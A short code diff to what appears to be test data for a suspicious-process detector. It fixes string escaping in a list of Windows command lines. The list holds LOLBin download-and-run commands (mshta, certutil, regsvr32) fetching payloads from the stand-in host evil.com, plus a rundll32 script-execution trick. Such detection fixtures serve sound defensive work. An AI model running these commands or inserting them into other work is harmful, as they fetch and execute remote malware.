@@ -204,7 +204,7 @@ SUSPICIOUS_PROCS = [
     'mshta.exe http://evil.com/payload.hta',
     'certutil.exe -urlcache -split -f http://evil.com/malware.exe',
     'regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll',
-    'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"',
+    r'rundll32.exe javascript:"\..\\mshtml,RunHTMLApplication"',
 ]
 NORMAL_PROCS = [
     'C:\\Windows\\System32\\svchost.exe -k netsvcs',
